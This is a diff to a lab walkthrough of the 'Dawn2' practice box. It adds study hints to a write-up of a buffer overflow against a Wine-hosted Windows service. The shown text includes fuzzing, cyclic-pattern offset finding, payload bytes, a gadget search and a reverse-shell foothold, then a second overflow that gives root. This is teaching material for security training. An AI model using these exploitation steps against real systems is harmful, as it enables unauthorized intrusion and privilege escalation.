@@ -28,8 +28,8 @@ Dawn2 exposes a static website that leaks a Windows PE server binary running und
 
 ```bash
 boxset BoxName Dawn2
-boxset BoxIP 192.168.198.12
-boxset LocalIP 192.168.45.202
+boxset BoxIP $BoxIP
+boxset LocalIP $LocalIP
 boxset Port 4444
 boxset WebPort 80
 ```
@@ -44,6 +44,12 @@ sudo nmap -Pn -n -sC -sV -p 80,1435,1985 "$BoxIP" -oA nmap/services
 ```
 
 The result is an Apache web server and two unrecognised custom TCP services.
+
+> [!warning] 💡 Hint
+> Custom services that do not identify themselves are not dead ends. Record the ports, then look for application files, download links, protocol clues, or a local copy that can be debugged safely.
+
+> [!tip] ⚡ More efficient path
+> Limit the version scan to the ports found by the full scan. This keeps the output readable and prevents repeated probing of every port while you are trying to understand the custom protocol.
 
 ```text
 80/tcp    open  http
@@ -81,6 +87,9 @@ PE32 executable for MS Windows 6.00 (console), Intel i386
 
 ⚡ Downloading the binary immediately is faster than trying to identify a banner from the custom services. A local copy lets us reproduce the crash under Wine and inspect the executable without repeatedly touching the single-shot network service.
 
+> [!abstract] 🧠 Why
+> The target is Linux, but the leaked service is a Windows PE binary running under Wine. That distinction controls both the local debugging approach and the shellcode architecture. The service process is Windows code, while the final payload must be a Linux shell because Wine hosts it on Linux.
+
 ![[2.1http-homepage.png]]
 SCREENSHOT: Homepage disclosing `/dawn.zip`.
 
@@ -107,6 +116,9 @@ for size in range(100, 1000, 100):
 ```
 
 Next, replace the repeated `A` bytes with a unique cyclic pattern and send it to the local copy. Wine reports the overwritten value as `316A4130`; the pattern offset calculation gives `272`.
+
+> [!tip] ⚡ Efficiency
+> Incremental fuzzing finds an approximate crash size; a cyclic pattern finds the exact overwrite. Once the local copy gives a stable offset, stop sending random sizes to the remote service and preserve the evidence in the exploit script.
 
 ```bash
 msf-pattern_create -l 300
@@ -135,6 +147,12 @@ payload = b"A" * 272 + b"B" * 4 + b"\x00"
 SCREENSHOT: EIP overwritten with `42424242`.
 
 The first gadget search looked at system DLLs, but the reliable choice is inside the target executable itself. Check the image base and search the binary for `PUSH ESP; RET`, `CALL ESP; RET`, or `JMP ESP`. Since this executable loads without ASLR in the lab, the address reported by the binary tool is usable directly.
+
+> [!warning] 💡 Common mistake
+> Do not add shellcode until `BBBB` proves EIP control and the bad-character test identifies what survives the protocol. If the crash occurs but execution does not reach the gadget, revisit the offset, byte order, terminator, and module base.
+
+> [!tip] 🛠️ Alternative tools
+> `ROPgadget`, `objdump`, `radare2`, and `rizin` can all locate candidate gadgets. Prefer a gadget in the target executable when its load address is stable, because it avoids depending on a different Wine or system DLL layout.
 
 ```bash
 objdump -p loot/dawn/dawn.exe | grep ImageBase
@@ -177,6 +195,9 @@ payload = padding + eip + nop_sled + shellcode + b"\x00"
 
 The callback lands as `dawn-daemon`.
 
+> [!warning] 💡 Hint
+> A fragile custom service may crash or stop responding after one bad packet. Keep the listener ready, send the exploit once, and reset the service before changing the payload. A failed callback does not automatically mean the offset is wrong.
+
 ```text
 uid=1000(dawn-daemon) gid=1000(dawn-daemon) groups=...
 hostname: dawn2
@@ -211,6 +232,9 @@ ls -la /home/dawn-daemon
 
 The output identifies `/root/dawn-BETA` as the root-run service and `/home/dawn-daemon/dawn-BETA.exe` as a readable copy for analysis. Serve the copy from the foothold and download it to Kali.
 
+> [!abstract] 🧠 Why
+> The first shell is not the final target. Local listener enumeration connects the open port to a root-owned process, and a readable copy lets you repeat the same exploit-development cycle without guessing at the privileged binary.
+
 ```bash
 python3 -m http.server 50000 --directory /home/dawn-daemon
 wget "http://$BoxIP:50000/dawn-BETA.exe" -O loot/dawn-BETA.exe
@@ -236,6 +260,23 @@ python3 loot/exploit_beta.py
 ```
 
 The callback is a root shell. Verify identity and read the proof flag by path.
+
+> [!warning] 💡 Common mistake
+> Do not probe the second single-shot service with a readiness check before the exploit. A connection test can consume the only useful request or crash the process. Start the listener and deliver the tested packet directly after a reset.
+
+> [!tip] ⚡ Efficiency
+> Reuse the development method, not the first-stage numbers. The second binary has its own offset, gadget, bad characters, and shellcode constraints, so confirm each one locally before sending the privileged packet.
+
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| Web page leaks a service archive | Download and debug locally under Wine | Inspect strings, README text, and protocol behavior before fuzzing the remote port |
+| Cyclic pattern controls EIP | Preserve offset and test a gadget | Use a target-binary gadget or inspect loaded modules if the preferred gadget is unavailable |
+| Callback fails after a crash | Reset the fragile service and change one variable | Use a harmless command or alternate callback port to separate exploit from egress issues |
+| Root-owned copy listens locally | Reproduce the overflow against the second binary | Compare offsets and gadgets independently rather than assuming the first exploit transfers |
+
+The remote services are effectively single-shot during testing, so local reproduction is the efficient and safer branch.
 
 ```bash
 id
